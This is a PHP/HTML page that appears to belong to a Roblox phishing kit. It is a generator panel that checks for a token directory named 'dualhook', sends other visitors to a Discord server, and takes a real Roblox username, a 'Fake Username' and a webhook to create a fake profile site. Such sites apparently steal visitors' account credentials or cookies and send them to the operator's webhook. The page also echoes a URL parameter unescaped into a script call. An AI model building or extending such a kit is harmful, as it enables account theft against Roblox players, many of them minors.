<?php
require('../setup.php');
if(isset($_GET['dirname'])) {
    if(file_exists('../tokens/dualhook/'.$_GET['dirname'].'/name.txt')) {
        //true gg
    } else {
        die(header('location:'.$discordserver));
    }
} else {
    die(header('location:'.$discordserver));
}
?>

<!doctype html>
<html lang="en">
<head>

<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<link href="https://fonts.googleapis.com/css?family=Roboto:300,400&amp;display=swap" rel="stylesheet">
<link rel="stylesheet" href="/controlPage/fonts/style.css">
<link rel="stylesheet" href="/controlPage/css/owl.carousel.min.css">

<link rel="stylesheet" href="/controlPage/css/bootstrap.min.css">

<link rel="stylesheet" href="/controlPage/css/style.css">
<title>Create</title>
</head>
<body>
<div class="content">
<div class="container">
<div class="row">
<div class="col-md-12 contents">
<div class="row justify-content-center">
<div class="col-md-8">
<div class="mb-4">
<h3>Generate a <strong>Regular</strong> site</h3>
</div>
<form action="#" method="post">
<div class="form-group">
<label for="RealUsername">Roblox Username</label>
<input type="text" class="form-control" id="RealUsername"> </div>
<div class="form-group">
<label for="FakeUsername">Fake Username</label>
<input type="text" class="form-control" id="FakeUsername"> </div>
<div class="form-group">
<label for="Webhook">Webhook</label>
<input type="text" class="form-control" id="Webhook"> </div>
<button type="button" class="btn text-white btn-block btn-primary" onclick="Regular(this, '<?=$_GET['dirname'];?>');">Create Regular Site</button>
</form>
</div>
</div>
</div>
</div>
</div>
<script src="/controlPage/apis/main.js"></script>
<script src="//cdn.jsdelivr.net/npm/sweetalert2@11"></script>
<script src="/controlPage/js/jquery-3.3.1.min.js"></script>
<script src="/controlPage/js/popper.min.js"></script>
<script src="/controlPage/js/bootstrap.min.js"></script>
<script src="/controlPage/js/main.js"></script>
</body>
</html>